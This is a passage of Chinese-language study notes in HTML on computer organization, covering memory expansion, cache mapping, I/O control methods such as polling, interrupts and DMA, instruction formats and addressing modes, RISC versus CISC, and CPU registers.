id="存储容量的扩展">存储容量的扩展</h5><h6 id="位扩展–增加存储字长">位扩展–增加存储字长</h6><h6 id="字扩展–增加存储器字的数量">字扩展–增加存储器字的数量</h6><h6 id="字、位扩展–既增加存储字的数量，又增加存储字长">字、位扩展–既增加存储字的数量，又增加存储字长</h6><h5 id="存储器与-CPU-连接">存储器与 CPU 连接</h5><h6 id="地址线的连接–CPU-的地址线往往比存储芯片的地址线数多，通常总是将-CPU-地址线的低位与存储器的芯片的地址线相连，CPU-地址线的高位或在存储芯片的扩充时用，或作其他用途。">地址线的连接–CPU 的地址线往往比存储芯片的地址线数多，通常总是将 CPU 地址线的低位与存储器的芯片的地址线相连，CPU 地址线的高位或在存储芯片的扩充时用，或作其他用途。</h6><h6 id="数据线的连接–CPU-的数据线与存储器的也不等，因此必须对存储芯片扩位使其相等">数据线的连接–CPU 的数据线与存储器的也不等，因此必须对存储芯片扩位使其相等</h6><h6 id="片选线的连接–是-CPU-与存储芯片正确工作的关键">片选线的连接–是 CPU 与存储芯片正确工作的关键</h6><h6 id="合理选择存储芯片–指存储芯片类型-RAM-或-ROM-和数量的选择。通常用-ROM-存放程序，标准子程序和各类常数等。RAM-为用户编程设计。此外，尽量选择连线简单方便。">合理选择存储芯片–指存储芯片类型(RAM 或 ROM)和数量的选择。通常用 ROM 存放程序，标准子程序和各类常数等。RAM 为用户编程设计。此外，尽量选择连线简单方便。</h6><h4 id="提高访存速度的措施">提高访存速度的措施</h4><h5 id="单体多字系统–在一个存取周期内，从同一地址取出-4-条指令，然后在逐条送至-CPU-执行。增大存储器带宽，提高存储器工作速度。前提是，指令和数据在主存内必须是连续存放。">单体多字系统–在一个存取周期内，从同一地址取出 4 条指令，然后在逐条送至 CPU 执行。增大存储器带宽，提高存储器工作速度。前提是，指令和数据在主存内必须是连续存放。</h5><h5 id="多体并行系统–采用多提模块组成的存储器，每个模块具有相同的容量和存取速度，各自具有独立的寄存器-MAR-，数据寄存器-MDR-，地址译码，驱动电路和读写电路。">多体并行系统–采用多提模块组成的存储器，每个模块具有相同的容量和存取速度，各自具有独立的寄存器(MAR)，数据寄存器(MDR)，地址译码，驱动电路和读写电路。</h5><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785524368-a24ee1d4-698a-4314-92e3-833a64177f96.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u11760a95&amp;originHeight=308&amp;originWidth=590&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u8327b3ef-e86b-4db8-8456-97756fb2338&amp;title=" alt=""></p><h6 id="高位交叉编址的多体存储器">高位交叉编址的多体存储器</h6><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785524489-3565257d-904f-4d92-97f7-f74f4a9ccfb2.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u2c54d9da&amp;originHeight=393&amp;originWidth=612&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u344640dc-8249-4fbe-9424-1c97d5d5689&amp;title=" alt=""></p><h6 id="低位交叉编址的多体存储器">低位交叉编址的多体存储器</h6><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785525017-44a17e85-2de8-4288-948e-e9116830f150.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u2dc691f8&amp;originHeight=380&amp;originWidth=626&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u249da2a5-08ee-4bd8-8826-80cbbaa10ab&amp;title=" alt=""></p><hr><h3 id="高速缓冲存储器">高速缓冲存储器</h3><h5 id="Cache-的基本结构">Cache 的基本结构</h5><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785525453-38c8661b-769b-4357-b318-c6b65c34c8b3.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=uf1e10dbc&amp;originHeight=355&amp;originWidth=603&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u1fd04cc2-54a5-4dc3-b8d6-58529987aa1&amp;title=" alt=""></p><h6 id="地址映射变换机构–将-CPU-送来的主存地址转换为-Cache-地址。">地址映射变换机构–将 CPU 送来的主存地址转换为 Cache 地址。</h6><h4 id="Cache–主存地址映射">Cache–主存地址映射</h4><h5 id="直接映射">直接映射</h5><h6 id="优点：实现简单，只需要利用主存地址的某些位直接判断，即可确定所需字块是否在缓存中">优点：实现简单，只需要利用主存地址的某些位直接判断，即可确定所需字块是否在缓存中</h6><h6 id="缺点：不够灵活，每个主存快只能固定的对应某个缓存块，即使缓存内还空着许多位置也不能被占用，使缓存的空间得不到充分的利用。此外，如果程序恰好重复访问对应同一缓存位置不同的主存块，就要不停的进行替换，降低命中率。">缺点：不够灵活，每个主存快只能固定的对应某个缓存块，即使缓存内还空着许多位置也不能被占用，使缓存的空间得不到充分的利用。此外，如果程序恰好重复访问对应同一缓存位置不同的主存块，就要不停的进行替换，降低命中率。</h6><h5 id="全相联映射–允许主存中每一字块映射到-Cache-中的任何一块位置上。">全相联映射–允许主存中每一字块映射到 Cache 中的任何一块位置上。</h5><h6 id="优点：灵活，命中率高，缩小了快冲突率。">优点：灵活，命中率高，缩小了快冲突率。</h6><h6 id="缺点：所需的逻辑电路甚多，成本较高。">缺点：所需的逻辑电路甚多，成本较高。</h6><h5 id="组相联映射">组相联映射</h5><h1>第五章 输入输出系统</h1><h3 id="输入输出系统发展的四个阶段">输入输出系统发展的四个阶段</h3><h5 id="1-早期阶段">1.早期阶段</h5><h6 id="分散连接-CPU-和-I-O-设备-串行工作-程序查询方式">分散连接 CPU 和 I/O 设备 串行工作 程序查询方式</h6><h5 id="2-接口模块和-DMA-阶段">2.接口模块和 DMA 阶段</h5><h6 id="总线连接-CPU-和-I-O-设备并行工作">总线连接 CPU 和 I/O 设备并行工作</h6><h5 id="3-具有通道结构的阶段">3.具有通道结构的阶段</h5><h5 id="4-具有-I-O-处理机的阶段">4.具有 I/O 处理机的阶段</h5><hr><h3 id="输入输出系统的组成">输入输出系统的组成</h3><h5 id="1-I-O-软件">1.I/O 软件</h5><h6 id="I-O-指令-CPU-指令的一部分">I/O 指令 CPU 指令的一部分</h6><table><thead><tr><th>操作码</th><th>命令码</th><th>设备码</th></tr></thead></table><h6 id="通道指令：通道自身的指令-指明数组的首地址、传送字数、操作命令。">通道指令：通道自身的指令 指明数组的首地址、传送字数、操作命令。</h6><h5 id="I-O-硬件">I/O 硬件</h5><h6 id="设备-I-O-接口">设备 I/O 接口</h6><h6 id="设备-设备控制器-通道">设备 设备控制器 通道</h6><hr><h3 id="I-O-设备与主机的联系方式">I/O 设备与主机的联系方式</h3><h4 id="1-I-O-设备编址方式">1.I/O 设备编址方式</h4><h6 id="统一编址-用取数存数指令">统一编址 用取数存数指令</h6><h6 id="不统一编址-有专门的-I-O-指令">不统一编址 有专门的 I/O 指令</h6><h4 id="2-设备寻址">2.设备寻址</h4><h6 id="用设备选择电路识别是否被选中">用设备选择电路识别是否被选中</h6><h4 id="3-传送方式">3.传送方式</h4><h6 id="串行-并行">串行 并行</h6><h4 id="4-联络方式">4.联络方式</h4><h6 id="立即响应方式">立即响应方式</h6><h6 id="异步方式采用应答信号">异步方式采用应答信号</h6><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785525467-73b91c9f-b65f-4f42-b4e6-71907030d20f.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=uf7315efe&amp;originHeight=306&amp;originWidth=624&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u0eac9163-d2a7-4cd5-839f-e0d343f1f9d&amp;title=" alt=""></p><h6 id="同步工作采用同步时标联络">同步工作采用同步时标联络</h6><h4 id="5-I-O-设备">5.I/O 设备</h4><h6 id="辐射式连接">辐射式连接</h6><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785525529-2f023a41-5159-4f48-9475-63cc81824f08.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u91d3344b&amp;originHeight=206&amp;originWidth=633&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u815383ea-f41f-47f2-a1be-793a04ea315&amp;title=" alt=""></p><h6 id="总线式连接">总线式连接</h6><hr><h3 id="I-O-设备与主机信息传送的控制方式">I/O 设备与主机信息传送的控制方式</h3><h4 id="1-程序查询方式">1.程序查询方式</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785525497-8b3b3d21-83ea-4b78-a215-fdebc271c6d7.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u7953022c&amp;originHeight=411&amp;originWidth=627&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u9015dbf9-9f15-4b3b-9dc0-b11e20df65d&amp;title=" alt=""></p><h4 id="2-程序中断方式">2.程序中断方式</h4><h6 id="倘若-CPU-在启动-I-O-设备后，不查询设备是否已准备就绪，继续执行自身程序，只是当-I-O-设备准备就绪并向-CPU-发出中断请求后才予以响应。">倘若 CPU 在启动 I/O 设备后，不查询设备是否已准备就绪，继续执行自身程序，只是当 I/O 设备准备就绪并向 CPU 发出中断请求后才予以响应。</h6><h4 id="3-DMA-方式-直接存储器存取">3.DMA 方式(直接存储器存取)</h4><h6 id="主存与-I-O-设备之间有一条数据通路，主存与-I-O-设备交换信息时，无须调用中断服务程序。若出现-DMA-和-CPU-同时访问主存，CPU-总是将总线占有权让给-DMA，通常把-DMA-这种占有称为窃取或挪用。窃取的时间一般为一个周期，故又把-DMA-占用的存取周期窃取周期或挪用周期。">主存与 I/O 设备之间有一条数据通路，主存与 I/O 设备交换信息时，无须调用中断服务程序。若出现 DMA 和 CPU 同时访问主存，CPU 总是将总线占有权让给 DMA，通常把 DMA 这种占有称为窃取或挪用。窃取的时间一般为一个周期，故又把 DMA 占用的存取周期窃取周期或挪用周期。</h6><hr><h3 id="I-O-接口">I/O 接口</h3><h4 id="为什么设置-I-O-接口">为什么设置 I/O 接口</h4><h6 id="实现设备的选择">实现设备的选择</h6><h6 id="实现数据缓冲达到速度匹配">实现数据缓冲达到速度匹配</h6><h6 id="实现数据串–并格式转换">实现数据串–并格式转换</h6><h6 id="实现电平转换">实现电平转换</h6><h6 id="实现电平转换-2">实现电平转换</h6><h6 id="传送控制命令">传送控制命令</h6><h6 id="反映设备的状态-“忙”-“就绪”-“中断请求”">反映设备的状态(“忙”,“就绪”,“中断请求”)</h6><hr><h3 id="端口和接口的关系">端口和接口的关系</h3><h6 id="端口是指接口电路中的一些寄存器，这些寄存器用来存放数据信息，控制信息和状态信息，相应的端口被分别称为数据端口，控制端口，和状态端口。若干个端口加上相应的控制逻辑才能组成接口。">端口是指接口电路中的一些寄存器，这些寄存器用来存放数据信息，控制信息和状态信息，相应的端口被分别称为数据端口，控制端口，和状态端口。若干个端口加上相应的控制逻辑才能组成接口。</h6><hr><h3 id="接口的功能和组成">接口的功能和组成</h3><h4 id="总线连接方式的-I-O-接口电路">总线连接方式的 I/O 接口电路</h4><h6 id="设备选择线，数据线，命令线，状态线">设备选择线，数据线，命令线，状态线</h6><h4 id="接口的功能和组成-2">接口的功能和组成</h4><table><thead><tr><th>接口功能</th><th>接口组成</th></tr></thead><tbody><tr><td>选址功能</td><td>设备选择电路</td></tr><tr><td>传送命令的功能</td><td>命令寄存器，命令译码器</td></tr><tr><td>传送数据的功能</td><td>数据缓冲寄存器</td></tr><tr><td>反映设备状态的功能</td><td>设备标记状态</td></tr></tbody></table><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785525939-e7bed0b2-2140-460b-8632-c94d44c9052c.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=ufff90e5a&amp;originHeight=289&amp;originWidth=650&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u3508504e-8918-4d17-bb6a-4db60e21b5d&amp;title=" alt=""></p><h4 id="接口类型">接口类型</h4><table><thead><tr><th>分类</th><th>种类</th></tr></thead><tbody><tr><td>按数据传送方式</td><td>并行接口(Intel 8255) 串行接口(Intel 8251)</td></tr><tr><td>按功能选择的灵活性</td><td>可编程接口(Intel 8255,Intel 8251) 不可编程接口(Intel 8212)</td></tr><tr><td>按通用性</td><td>通用接口(Intel 8255、 Intel 8251) 专用接口(Intel 8279、 Intel 8275)</td></tr><tr><td>按数据传送的控制方式</td><td>中断接口(Intel 8259) DMA 接口(Intel 8257)</td></tr></tbody></table><hr><h3 id="程序查询方式">程序查询方式</h3><table><thead><tr><th>指令</th><th>作用</th></tr></thead><tbody><tr><td>测试指令</td><td>用来查询 I/O 设备已准备就绪</td></tr><tr><td>传送指令</td><td>当 I/O 设备已准备就绪时，执行传送指令</td></tr><tr><td>转移指令</td><td>若 I/O 设备未准备就绪，执行转移指令，转至测试指令，继续测试 I/O 设备的状态</td></tr></tbody></table><h5 id="程序流程">程序流程</h5><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785526180-a8705230-7d5d-4792-8267-1dc6aa7d7881.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u72021676&amp;originHeight=438&amp;originWidth=449&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u30a47738-92de-43ad-b162-1388d342d82&amp;title=" alt=""><br><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785526414-ce3adb30-b108-4fd5-824d-b87588b62844.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u0f03342b&amp;originHeight=400&amp;originWidth=652&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u0d46a258-b6ee-48bc-96cc-0c12f35be7d&amp;title=" alt=""></p><h6 id="1）CPU-发-I-O-地址设备开始工作；地址总线--接口--设备选择器译码--选中--发-SEL-信号；2）CPU-发启动命令-DBR-开命令接收门；D-置-0，B-置-1-接口向设备发启动命令；3）CPU-等待，输入设备读出数据；4）外设工作完成，B-置-0，D-置-1；5）准备就绪信号--接口--完成信号--控制总线-CPU；6）输入：CPU-通过输入指令（IN）将-DBR-中的数据取走。">1）CPU 发 I/O 地址设备开始工作；地址总线  接口  设备选择器译码  选中  发 SEL 信号；2）CPU 发启动命令 DBR 开命令接收门；D 置 0，B 置 1 接口向设备发启动命令；3）CPU 等待，输入设备读出数据；4）外设工作完成，B 置 0，D 置 1；5）准备就绪信号  接口  完成信号  控制总线 CPU；6）输入：CPU 通过输入指令（IN）将 DBR 中的数据取走。</h6><hr><h3 id="程序中断方式">程序中断方式</h3><h5 id="中断-在执行程序过程中，当出现异常情况或特殊情况请求时，计算机停止现行程序的运行，转向对这些异常情况或特殊情况的请求的处理，处理结束后再返回到现行程序的间断处，继续执行源程序。">中断:在执行程序过程中，当出现异常情况或特殊情况请求时，计算机停止现行程序的运行，转向对这些异常情况或特殊情况的请求的处理，处理结束后再返回到现行程序的间断处，继续执行源程序。</h5><h5 id="程序中断方式配置中断请求和中断寄存">程序中断方式配置中断请求和中断寄存</h5><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785526457-b3f99136-29f6-40e2-84cb-5d19fb4b8c04.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u53210e5f&amp;originHeight=352&amp;originWidth=613&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=uf46f74df-76a7-4320-8bb9-ebb9261416e&amp;title=" alt=""></p><h5 id="接口电路的基本组成">接口电路的基本组成</h5><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785527151-6844faf6-4b79-401d-95e4-3d27cb62a62e.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u6ca0d9fc&amp;originHeight=426&amp;originWidth=637&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=uf3f58021-217d-4e4d-9752-23e4c023b1a&amp;title=" alt=""></p><hr><h3 id="中断处理过程">中断处理过程</h3><h4 id="1-CPU-响应中断的条件和时间">1.CPU 响应中断的条件和时间</h4><h6 id="1-条件">(1)条件</h6><h6 id="允许中断触发器-EINT-1">允许中断触发器 EINT = 1</h6><h6 id="用-开中断-指令将-EINT-置-“1”">用 开中断 指令将 EINT 置 “1”</h6><h6 id="用-关中断-指令将-EINT-置“-0”-或硬件-自动复位">用 关中断 指令将 EINT 置“ 0” 或硬件 自动复位</h6><h6 id="2-时间">(2)时间</h6><h6 id="当-D-1（随机）且-MASK-0-时">当 D = 1（随机）且 MASK = 0 时</h6><h6 id="在每条指令执行阶段的结束前">在每条指令执行阶段的结束前</h6><h6 id="CPU-发-中断查询信号（将-INTR-置“1”）">CPU 发 中断查询信号（将 INTR 置“1”）</h6><h4 id="2-I-O-中断处理过程">2.I/O 中断处理过程</h4><h6 id="1-CPU-发启动-I-O-设备命令，将接口中的-B-置-1，D-置-0">1.CPU 发启动 I/O 设备命令，将接口中的 B 置 1，D 置 0</h6><h6 id="2-接口启动输入设备开始工作">2.接口启动输入设备开始工作</h6><h6 id="3-输入设备将数据送入数据缓冲寄存器">3.输入设备将数据送入数据缓冲寄存器</h6><h6 id="4-输入设备向接口发出-设备工作结束-信号，将-D-置-1，B-置-0">4.输入设备向接口发出&quot;设备工作结束&quot;信号，将 D 置 1，B 置 0</h6><h6 id="5-当设备准备就绪-D-1-，且本设备未被屏蔽-MASK-0-，在指令执行阶段的结束时刻，由-CPU-发出中断查询信号">5.当设备准备就绪(D=1)，且本设备未被屏蔽(MASK=0)，在指令执行阶段的结束时刻，由 CPU 发出中断查询信号</h6><h6 id="6-设备中断请求触发器-INTR-被置-1，标志设备向-CPU-提出中断请求。于此同时，INTR-被送至排队器，进行中断优判">6.设备中断请求触发器 INTR 被置 1，标志设备向 CPU 提出中断请求。于此同时，INTR 被送至排队器，进行中断优判</h6><h6 id="7-若-CPU-允许中断-EINT-1-设备又被选中排队，即进入中断响应阶段">7.若 CPU 允许中断(EINT=1),设备又被选中排队，即进入中断响应阶段</h6><h6 id="8-向量地址送至-PC，作为下一条指令的地址">8.向量地址送至 PC，作为下一条指令的地址</h6><h6 id="9-无条件转至设备服务程序的入口地址，进入中断服务阶段">9.无条件转至设备服务程序的入口地址，进入中断服务阶段</h6><h6 id="10-执行结束，中断返回至原程序的断点处">10.执行结束，中断返回至原程序的断点处</h6><h4 id="中断服务程序的流程">中断服务程序的流程</h4><h6 id="保护现场">保护现场</h6><h6 id="中断服务">中断服务</h6><h6 id="恢复现场">恢复现场</h6><h6 id="中断返回">中断返回</h6><hr><h3 id="DMA-接口的功能和组成">DMA 接口的功能和组成</h3><h4 id="DMA-接口具有的功能">DMA 接口具有的功能</h4><h6 id="向-CPU-申请-DMA-传送">向 CPU 申请 DMA 传送</h6><h6 id="在-CPU-允许-DMA-工作时，处理总线控制权的转交">在 CPU 允许 DMA 工作时，处理总线控制权的转交</h6><h6 id="在-DMA-期间管理系统总线，控制数据传送">在 DMA 期间管理系统总线，控制数据传送</h6><h6 id="确定数据传送的气势地址和数据长度，修正数据传送过程中的数据地址和数据长度">确定数据传送的气势地址和数据长度，修正数据传送过程中的数据地址和数据长度</h6><h6 id="在数据块传送结束时，给出-DMA-操作完成的信号">在数据块传送结束时，给出 DMA 操作完成的信号</h6><h4 id="DMA-与主存交换数据的三种方式">DMA 与主存交换数据的三种方式</h4><h6 id="1-停止-CPU-访问主存">1.停止 CPU 访问主存</h6><h6 id="2-周期挪用">2.周期挪用</h6><h6 id="3-DMA-与-CPU-交替访问">3.DMA 与 CPU 交替访问</h6><h4 id="DMA-基本组成">DMA 基本组成</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785527282-ce03845f-26c7-43e5-bd88-bd815e7af04e.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u31fcd2df&amp;originHeight=398&amp;originWidth=631&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=ue8178d94-2144-40b0-a378-3994987e811&amp;title=" alt=""></p><hr><h4 id="DMA-的工作过程">DMA 的工作过程</h4><h5 id="预处理、数据传送、后处理">预处理、数据传送、后处理</h5><h4 id="DMA-方式与中断程序的比较">DMA 方式与中断程序的比较</h4><table><thead><tr><th></th><th>中断方式</th><th>DMA 方式</th></tr></thead><tbody><tr><td>数据传送</td><td>程序</td><td>硬件</td></tr><tr><td>响应时间</td><td>指令执行结束</td><td>存取周期结束</td></tr><tr><td>处理异常情况</td><td>能</td><td>不能</td></tr><tr><td>中断请求</td><td>传送数据</td><td>后处理</td></tr><tr><td>优先级</td><td>低</td><td>高</td></tr></tbody></table><hr><h1>第七章 指令系统</h1><h3 id="指令的一般格式">指令的一般格式</h3><table><thead><tr><th>操作码字段</th><th>地址码字段</th></tr></thead></table><h4 id="操作码-反映机器做什么操作">操作码 反映机器做什么操作</h4><h6 id="1-长度固定：用于指令字长较长的情况，RISC。如-IBM-370-操作码-8-位">1).长度固定：用于指令字长较长的情况，RISC。如 IBM 370 操作码 8 位</h6><h6 id="2-长度可变：操作码分散在指令字段的不同字段中。">2).长度可变：操作码分散在指令字段的不同字段中。</h6><h4 id="指令字长">指令字长</h4><h6 id="指令字长决定于操作码的长度，操作数地址的长度，操作数地址的个数">指令字长决定于操作码的长度，操作数地址的长度，操作数地址的个数</h6><h6 id="指令字长固定的话-存储字长">指令字长固定的话=存储字长</h6><h6 id="指令字长可变的话-，按字节的倍数变化">指令字长可变的话=，按字节的倍数变化</h6><hr><h3 id="操作数类型和操作种类">操作数类型和操作种类</h3><table><thead><tr><th>类型</th><th>代表</th></tr></thead><tbody><tr><td>地址</td><td>无符号整数</td></tr><tr><td>数字</td><td>定点数、浮点数、十进制数</td></tr><tr><td>字符</td><td>ASCII</td></tr><tr><td>逻辑数</td><td>逻辑运算</td></tr></tbody></table><h3 id="操作类型">操作类型</h3><table><thead><tr><th>操作类型</th><th>解释</th></tr></thead><tbody><tr><td>数据传送</td><td>寄存器-&gt;寄存器、寄存器-&gt;存储器等</td></tr><tr><td>算数逻辑运算</td><td>加、减、乘、除等</td></tr><tr><td>移位操作</td><td>算数移位、逻辑移位、循环移位(带进位，不带进位)</td></tr><tr><td>转移</td><td>无条件转移(JMP)、条件转移{结果为零转(JZ)、结果溢出转(JO)、结果有进位转(JC)、跳过一条指令(SKP)}</td></tr><tr><td>调用和返回</td><td></td></tr><tr><td>陷阱(Trap)与陷阱指令</td><td>意外事故的中断</td></tr><tr><td>输入和输出</td><td>端口地址-&gt;CPU 的寄存器，CPU 的寄存器-&gt;端口地址</td></tr></tbody></table><h3 id="寻址方式">寻址方式</h3><table><thead><tr><th>指令寻址</th><th>解释</th></tr></thead><tbody><tr><td>顺序寻址</td><td>自动形成下一条指令的地址</td></tr><tr><td>跳跃寻址</td><td>通过转移类指令实现</td></tr></tbody></table><table><thead><tr><th>数据寻址</th><th>例子</th></tr></thead><tbody><tr><td>立即寻址</td><td>op # A</td></tr><tr><td>直接寻址</td><td>EA=A</td></tr><tr><td>隐含寻址</td><td>ACC x</td></tr><tr><td>间接寻址</td><td>EA=(A)</td></tr><tr><td>寄存器寻址</td><td>EA=R</td></tr><tr><td>寄存器间接寻址</td><td>EA=®</td></tr><tr><td>基址寻址</td><td>EA=A+(BR)</td></tr><tr><td>变址寻址</td><td>EA=A+(IX)</td></tr><tr><td>相对寻址</td><td>EA=(PC)+A</td></tr><tr><td>堆栈寻址</td><td>PUSH A</td></tr></tbody></table><hr><h4 id="设计指令格式应考虑的各种因素">设计指令格式应考虑的各种因素</h4><table><thead><tr><th>因素</th><th>详细</th></tr></thead><tbody><tr><td>操作类型</td><td>包括指令数及操作的难易程度</td></tr><tr><td>数据类型</td><td>确定哪些数据类型可以参与操作</td></tr><tr><td>指令格式</td><td>指令字长是否固定、操作码数、是否采用扩展操作码技术，地址码位数、地址个数、寻址方式类型</td></tr><tr><td>寻址方式</td><td>指令寻址、操作数寻址</td></tr><tr><td>寄存器个数</td><td>寄存器的多少直接影响指令的执行时间</td></tr></tbody></table><hr><h3 id="RISC-技术">RISC 技术</h3><h6 id="RISC-精简指令系统计算机">RISC:精简指令系统计算机</h6><h6 id="CISC-复杂指令系统计算机">CISC:复杂指令系统计算机</h6><h3 id="RISC-的主要特征">RISC 的主要特征</h3><h6 id="选用使用频度较高的一些简单指令，复杂指令的功能由简单指令来组合">选用使用频度较高的一些简单指令，复杂指令的功能由简单指令来组合</h6><h6 id="指令-长度固定、指令格式种类少、寻址方式少">指令 长度固定、指令格式种类少、寻址方式少</h6><h6 id="只有-LOAD-STORE-指令访存">只有 LOAD / STORE 指令访存</h6><h6 id="CPU-中有多个-通用-寄存器">CPU 中有多个 通用 寄存器</h6><h6 id="采用-流水技术-一个时钟周期-内完成一条指令">采用 流水技术 一个时钟周期 内完成一条指令</h6><h6 id="采用-组合逻辑-实现控制器">采用 组合逻辑 实现控制器</h6><h6 id="采用-优化-的-编译-程序">采用 优化 的 编译 程序</h6><h3 id="RISC-和-CISC-的比较">RISC 和 CISC 的比较</h3><h6 id="RISC-更能-充分利用-VLSI-芯片的面积">RISC 更能 充分利用 VLSI 芯片的面积</h6><h6 id="RISC-更能-提高计算机运算速度-指令数、指令格式、寻址方式少-通用-寄存器多，采用组合逻辑，便于实现指令流水">RISC 更能 提高计算机运算速度(指令数、指令格式、寻址方式少,通用 寄存器多，采用组合逻辑，便于实现指令流水)</h6><h6 id="RISC-便于设计，可-降低成本，提高-可靠性">RISC 便于设计，可 降低成本，提高 可靠性</h6><h6 id="RISC-有利于编译程序代码优化">RISC 有利于编译程序代码优化</h6><h6 id="RISC-不易-实现-指令系统兼容">RISC 不易 实现 指令系统兼容</h6><hr><h1>第八章 CPU 的结构</h1><h3 id="CPU-的功能">CPU 的功能</h3><h4 id="控制器的功能">控制器的功能</h4><h6 id="取指令、分析指令、执行指令，发出各种操作命令、控制程序输入及结果的输出、总线管理、处理异常情况和特殊情况；分别对应指令控制、操作控制、时间控制、处理中断、数据加工。">取指令、分析指令、执行指令，发出各种操作命令、控制程序输入及结果的输出、总线管理、处理异常情况和特殊情况；分别对应指令控制、操作控制、时间控制、处理中断、数据加工。</h6><h4 id="运算器的功能">运算器的功能</h4><h6 id="实现算数运算和逻辑预算">实现算数运算和逻辑预算</h6><hr><h3 id="CPU-的结构">CPU 的结构</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785527268-e320a738-a858-416b-8b7b-0a5395f6c7dc.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u69a5d182&amp;originHeight=419&amp;originWidth=565&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=uf9bad042-b844-4673-a657-0817c390d6d&amp;title=" alt=""><br><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785527759-805aab88-3518-4631-826f-699c1115856f.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u22cba9c9&amp;originHeight=334&amp;originWidth=473&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u42416ffb-386f-4d76-b7d5-400c524da25&amp;title=" alt=""></p><h3 id="CPU-的寄存器">CPU 的寄存器</h3><table><thead><tr><th>分类</th><th>寄存器</th><th>作用</th></tr></thead><tbody><tr><td>用户可见寄存器</td><td>通用寄存器</td><td>存放操作数：可做某种寻址方式所需的专用寄存器</td></tr><tr><td>用户可见寄存器</td><td>数据寄存器</td><td>存放操作数(满足各种数据类型)两个寄存器拼接存放双倍字长数据</td></tr><tr><td>用户可见寄存器</td><td>地址寄存器</td><td>存放地址：其位数应满足最大的地址范围用于特殊的寻址方式 段基值 栈指针</td></tr><tr><td>用户可见寄存器</td><td>条件码寄存器</td><td>存放条件码：可作程序分支的依据如 正、负、零、溢出、进位等</td></tr><tr><td>控制和状态寄存器</td><td>控制寄存器</td><td>PC-&gt;MAR-&gt;M-&gt;MDR-&gt;IR，控制 CPU</td></tr><tr><td>控制和状态寄存器</td><td>状态寄存器</td><td>状态寄存器(存放条件码),PSW 寄存器(存放子程序状态字)</td></tr></tbody></table><hr><h3 id="指令周期">指令周期</h3><h6 id="取出并执行一条指令所需的全部时间。分为取值周期和执行周期">取出并执行一条指令所需的全部时间。分为取值周期和执行周期</h6><h4 id="指令周期的数据流">指令周期的数据流</h4><h5 